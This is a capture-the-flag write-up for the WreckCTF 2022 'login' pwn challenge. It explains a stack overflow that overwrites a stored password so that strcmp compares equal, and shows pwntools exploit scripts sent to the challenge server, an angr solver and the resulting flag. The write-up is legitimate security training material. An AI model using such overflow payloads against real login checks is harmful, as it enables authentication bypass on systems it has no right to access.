# WRECKCTF 2022 - login

* **Category:** pwn
* **Points:** 414
* **Author:** josephg

## Challenge

> you'll never get my password!

## Solution
![image](https://user-images.githubusercontent.com/78451563/193476675-22bcf3d9-262d-4802-b0a1-5c0a1c37011f.png)

There's an overflow on line 18 which we could leverage to bypass the check.
```python
from pwn import *
elf = context.binary = ELF('./challenge')
p = remote("challs.wreckctf.com",31009)
log.info(p.clean())
payload = flat(
	# input_password
	b"A"*1, # Our new set password 
	b"\x00"*1, # strcmp() null byte terminal
	b"B"*14, # padding
	# password overwrite
	b"A"*1,
	b"\x00"*1,
	b"B"*14
)
p.sendline(payload)
p.interactive()
```
![image](https://user-images.githubusercontent.com/78451563/193477300-31035084-120d-4948-adb3-897b981a11db.png)

The binary uses strcmp() against our input and the password so if the first character of two strings is equal, the next character of two strings are compared. This continues until the corresponding characters of two strings are different or a null character '\x00' is reached.
```python
#!/usr/bin/env python3
import angr
import claripy
import time
import logging
t=time.time()
logging.getLogger('angr').setLevel(logging.INFO)
p = angr.Project('./challenge', auto_load_libs=False)
state = p.factory.entry_state(add_options=angr.options.unicorn)
sm = p.factory.simulation_manager(state)
sm.explore(find=0x40147a,avoid=0x401481) # find=print_flag(),avoid=puts("Sorry, incorrect password\n")
print('Input: \n{}'.format(sm.found[0].posix.dumps(0)))
print('Std output: \n{}'.format(sm.found[0].posix.dumps(1)))
print(time.time() - t, "seconds")
```
We can also use ANGR to brainlessly solve this PWN challenge.
```
b'\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```
After running we get this as our input for the found state. Now to put it into a script and send to remote.
```python
from pwn import *
elf = context.binary = ELF('./challenge')
p = remote("challs.wreckctf.com",31009)
log.info(p.clean())
print_flag = b'\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
p.sendline(print_flag)
p.interactive()
```
![image](https://user-images.githubusercontent.com/78451563/193476208-4a63a834-aab1-4cff-a161-647e609569cc.png)

```
Flag: flag{i_wish_could_gets_more_runes}
```
